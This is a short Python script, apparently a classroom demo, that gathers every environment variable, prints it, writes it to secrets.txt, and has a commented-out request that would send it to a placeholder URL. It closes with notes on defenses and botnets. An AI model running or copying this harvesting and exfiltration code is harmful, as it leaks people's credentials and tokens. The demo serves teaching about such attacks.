import os
import json
import requests
 
 
secrets = dict(os.environ)
 
json_secrets = json.dumps((secrets))
 
print(json_secrets)
 
# Only uncomment these lines if you want to send json_secrets to the URL
# This is not advised on your local machine
# response = requests.get('YOUR_WEB_URL', data = json_secrets)
 
# print(response.request.url)
 
# print(response.status_code)
 
file = open("secrets.txt", "a")
 
file.write(json_secrets)
 
file = open("secrets.txt", "r")
 
line = file.readline()
 
print(line)

# Change YOUR_WEB_URL to the URL of a website or service that you own

# IMPORTANT: Do not try this locally, as it will print your local environment variables and try to send them to the Internet

# Potential remediation: - malware protection, - regular patching, 
# - network monitoring (monitor your fridge if it has WiFi;)), - asset management (monitoring authorization, connection within ethernet etc.), 
# - access point protection (physical, information security, following protocols)
# Defense: firewalls (filter traffic(removing/preventing) and address filtering); request throttling; multi-factor authentification.

# To sum up, botnets are often used for DDos attacks, "zombie" computers infected with malware, a form of cybersecurity vulnerability.
